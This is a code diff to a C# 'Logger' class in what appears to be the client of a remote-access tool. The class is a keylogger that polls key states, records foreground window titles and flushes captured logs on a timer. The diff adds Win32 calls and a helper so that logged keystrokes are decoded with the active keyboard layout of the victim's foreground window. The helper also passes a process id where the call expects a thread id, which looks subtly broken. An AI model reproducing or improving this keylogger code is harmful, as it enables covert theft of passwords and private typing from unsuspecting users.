@@ -9,20 +9,26 @@ namespace xClient.Core
 {
     public class Logger
     {
-        [DllImport("User32.dll")]
+        [DllImport("user32.dll")]
         private static extern short GetAsyncKeyState(Keys vKey);
 
-        [DllImport("User32.dll")]
+        [DllImport("user32.dll")]
         private static extern short GetAsyncKeyState(int vKey);
 
-        [DllImport("User32.dll")]
+        [DllImport("user32.dll")]
         public static extern int GetWindowText(int hwnd, StringBuilder s, int nMaxCount);
 
-        [DllImport("User32.dll")]
+        [DllImport("user32.dll")]
         public static extern int GetForegroundWindow();
 
         [DllImport("user32.dll", CharSet = CharSet.Unicode)]
         public static extern int ToUnicodeEx(int wVirtKey, uint wScanCode, byte[] lpKeyState, StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
+        public static extern IntPtr GetKeyboardLayout(int dwLayout);
+
+        [DllImport("user32.dll", SetLastError = true)]
+        static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
 
         public bool Enabled
         {
@@ -112,7 +118,6 @@ namespace xClient.Core
             this.timerFlush.Elapsed += new System.Timers.ElapsedEventHandler(this.timerFlush_Elapsed);
             this.timerFlush.Interval = flushInterval;
         }
-
 
         private void timerLogKeys_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
         {
@@ -235,6 +240,23 @@ namespace xClient.Core
             return title != "" ? title : null;
         }
 
+        public static IntPtr GetActiveKeyboardLayout()
+        {
+            int hWnd = 0;
+
+            hWnd = GetForegroundWindow();
+
+            IntPtr i = new IntPtr(hWnd);
+
+            uint pid;
+
+            GetWindowThreadProcessId(i, out pid);
+
+            IntPtr layout = GetKeyboardLayout((int)pid);
+
+            return layout;
+        }
+
         public static char? FromKeys(int keys, bool shift)
         {
             var keyStates = new byte[256];
@@ -244,7 +266,7 @@ namespace xClient.Core
 
             var sb = new StringBuilder(10);
 
-            return ToUnicodeEx(keys, 0, keyStates, sb, sb.Capacity, 0, InputLanguage.CurrentInputLanguage.Handle) == 1 ? (char?)sb[0] : null;
+            return ToUnicodeEx(keys, 0, keyStates, sb, sb.Capacity, 0, GetActiveKeyboardLayout()) == 1 ? (char?)sb[0] : null;
         }
     }
 }
